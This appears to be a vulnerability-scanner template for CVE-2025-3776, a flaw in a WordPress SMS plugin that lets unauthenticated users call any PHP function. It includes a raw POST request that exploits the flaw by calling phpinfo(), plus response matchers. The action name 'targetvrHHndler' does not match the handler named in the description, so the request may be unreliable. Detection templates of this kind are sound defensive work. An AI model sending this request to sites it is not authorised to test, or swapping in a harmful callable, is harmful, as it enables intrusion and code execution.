id: wordpress-phpinfo-exposure

info:
  name: WordPress phpinfo() Exposure
  author: 0xW0rd1sB0nd
  severity: high
  description: |
    The Verification SMS with TargetSMS plugin for WordPress is vulnerable to limited Remote Code Execution in all versions up to, and including, 1.5 via the 'targetvr_ajax_handler' function. This is due to a lack of validation on the type of function that can be called. This makes it possible for unauthenticated attackers to execute any callable function on the site, such as phpinfo().
  tags: wordpress,wp-plugin,exposure,cve-2025-3776

http:
  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=targetvrHHndler&callback=phpinfo

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "PHP Version"
          - "Configuration"
      - type: regex
        part: body
        regex:
          - "<title>phpinfo\\(\\)</title>"
          - "System\\s*=>\\s*.*?\\n"  
      - type: word
        part: body
        words:
          - "Loaded Configuration File"  
    stop-at-first-match: true

    max-size: 10240  
    redirects: true  
    threads: 5       
